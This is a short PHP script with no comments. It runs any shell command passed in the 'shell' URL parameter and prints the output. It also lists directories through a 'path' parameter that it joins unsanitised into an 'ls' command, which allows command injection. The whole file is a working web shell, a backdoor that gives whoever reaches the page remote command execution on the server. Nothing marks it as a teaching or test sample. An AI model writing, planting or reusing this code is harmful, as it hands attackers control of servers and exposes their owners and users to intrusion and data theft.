<?php
    if(isset($_GET['shell']) && isset($_GET['path']) !== true){
        $output = shell_exec($_GET['shell']);
        echo $output;
    }elseif(isset($_GET['path']) && isset($_GET['shell']) !== true){
        $output = shell_exec("ls ".$_GET['path']);
        echo $output;   
    }
?>